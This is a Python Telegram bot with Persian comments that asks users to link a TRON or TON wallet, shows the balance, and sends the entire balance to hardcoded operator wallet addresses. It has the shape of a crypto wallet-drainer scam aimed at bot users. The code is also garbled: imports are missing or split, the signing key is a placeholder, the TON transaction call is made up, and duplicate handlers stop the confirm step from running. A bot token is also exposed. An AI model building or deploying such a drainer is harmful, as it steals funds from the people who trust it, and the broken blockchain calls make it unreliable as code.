from telegram.ext import Updater,
CommandHandler, MessageHandler,
Filters , CallbackContext

# توکن ربات تلگرام
TOKEN = "7989787294:AAEvfYAphjhmBh-6bUQEvBuJaW2WDeBynL0"

# آدرس کیف پول‌ها
tron_address = 'TVWuPAYCPGHu4hYfs9dgH9ynxgwcFfS3pz'
ton_address = 'UQC5S1zwtK0Mr2UihzpfXpSAmUCEcLtxt_zLT4UghLZQ-o1d'

# تنظیمات ربات تلگرام
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

def start(update: Update, context: CallbackContext):
    # شروع کار ربات و درخواست اتصال کیف پول
    update.message.reply_text(
        'سلام! برای ادامه کار لطفاً کیف پول خود را متصل کنید (ترون یا تون).')
    update.message.reply_text(
        'برای مثال: "ترون کیف پول" یا "تون کیف پول" یا ارسال آدرس کیف پول خود.'
    )

def handle_wallet_link(update: Update, context: CallbackContext):
    # گرفتن لینک کیف پول و شناسایی شبکه
    wallet_link = update.message.text.strip()

    # بررسی اینکه لینک ترون است یا تون
    if 'tronlink' in wallet_link:
        update.message.reply_text('کیف پول ترون شناسایی شد.')
        balance = get_tron_balance(wallet_link)  # موجودی کیف پول ترون
        update.message.reply_text(f'موجودی شما {balance} TRX است. آیا می‌خواهید تمام موجودی را ارسال کنید؟')
        update.message.reply_text('برای ارسال تایید کنید.')
        context.user_data['wallet'] = wallet_link
        context.user_data['network'] = 'tron'
    elif 'tonlink' in wallet_link:
        update.message.reply_text('کیف پول تون شناسایی شد.')
        balance = get_ton_balance(wallet_link)  # موجودی کیف پول تون
        update.message.reply_text(f'موجودی شما {balance} nanoTON است. آیا می‌خواهید تمام موجودی را ارسال کنید؟')
        update.message.reply_text('برای ارسال تایید کنید.')
        context.user_data['wallet'] = wallet_link
        context.user_data['network'] = 'ton'
    else:
        update.message.reply_text('لینک کیف پول نامعتبر است. لطفاً دوباره تلاش کنید.')

def get_tron_balance(wallet_link: str) -> float:
    # گرفتن موجودی کیف پول ترون
    tron = Tron()
    balance = tron.trx.get_balance(wallet_link)
    return balance / 10**6  # تبدیل موجودی از sun به TRX

def get_ton_balance(wallet_link: str) -> int:
    # گرفتن موجودی کیف پول تون
    response = requests.get(f'https://testnet.toncenter.com/api/v2/jsonRPC/accounts/{wallet_link}')
    if response.status_code == 200:
        balance = response.json()['result']['balance']
        return balance
    return 0

def send_tron(wallet_link: str, amount: float, update: Update):
    # ارسال تراکنش به شبکه ترون
    tron = Tron()
    from_address = wallet_link
    to_address = tron_address
    pk = PrivateKey.fromhex('USER_PRIVATE_KEY')  # باید کلید خصوصی کاربر وارد بشه
    txn = tron.trx.transfer(from_address, to_address, amount * 10**6)  # تبدیل به sun
    txn = txn.sign(pk)
    txn_hash = txn.broadcast()
    update.message.reply_text(f"تراکنش ارسال شد: {txn_hash['txid']}")

def send_ton(wallet_link: str, amount: int, update: Update):
    # ارسال تراکنش به شبکه تون
    response = requests.post('https://testnet.toncenter.com/api/v2/jsonRPC/sendTransaction', json={
        'from': wallet_link,
        'to': ton_address,
        'amount': amount
    })
    if response.status_code == 200:
        result = response.json()
        update.message.reply_text(f"تراکنش ارسال شد: {result['transaction_id']}")
    else:
        update.message.reply_text('خطا در ارسال تراکنش.')

def confirm_transaction(update: Update, context: CallbackContext):
    # تایید تراکنش توسط کاربر
    if 'wallet' not in context.user_data or 'network' not in context.user_data:
        update.message.reply_text('لطفاً کیف پول خود را ابتدا متصل کنید.')
        return

    wallet_link = context.user_data['wallet']
    network = context.user_data['network']
    
    if network == 'tron':
        balance = get_tron_balance(wallet_link)
        send_tron(wallet_link, balance, update)
    elif network == 'ton':
        balance = get_ton_balance(wallet_link)
        send_ton(wallet_link, balance, update)

def main():
    # استارت ربات
    updater = Updater(TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    # دستورات ربات
    dispatcher.add_handler(CommandHandler('start', start))
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_wallet_link))
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, confirm_transaction))

    # شروع ربات
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
